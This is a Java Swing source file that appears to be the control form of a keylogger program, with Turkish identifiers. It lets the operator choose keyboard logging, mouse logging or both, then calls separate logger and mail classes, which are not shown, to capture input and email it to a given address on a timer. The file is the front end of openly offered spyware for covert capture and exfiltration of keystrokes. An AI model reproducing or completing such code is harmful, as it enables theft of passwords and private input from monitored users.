import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.util.Timer;
import java.util.TimerTask;

public class Form extends JFrame {

    mail nesne = new mail();
    key_mouselogger nesne1 = new key_mouselogger();
    private JTextField textField1;
    private JTextField textField2;
    private JRadioButton sadeceFareRadioButton;
    private JRadioButton sadeceKlavyeRadioButton;
    private JRadioButton herIkisiRadioButton;
    private JButton durdurButton;
    private JButton başlatButton;
    private JPanel forms;

    public Form(){

       add(forms);
       setSize(800,400);
       setTitle("Keylogger Form");

        başlatButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

              if(sadeceFareRadioButton.isSelected()){
                  int time = Integer.parseInt(textField1.getText());
                  String formmail = textField2.getText();
                 nesne1.mouselog();
                 nesne.timer(time*60000,formmail);


              }
              else if(sadeceKlavyeRadioButton.isSelected()){
                  int time = Integer.parseInt(textField1.getText());
                  String formmail = textField2.getText();
                  nesne1.loggs();
                  nesne.timer(time*60000,formmail);

              }
              else if (herIkisiRadioButton.isSelected()) {
                  int time = Integer.parseInt(textField1.getText());
                  String formmail = textField2.getText();
                  nesne1.mouselog();
                  nesne1.loggs();
                  nesne.timer(time*60000,formmail);
              }

            }


        });

        durdurButton.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                System.exit(0);

            }


        });
    }
}
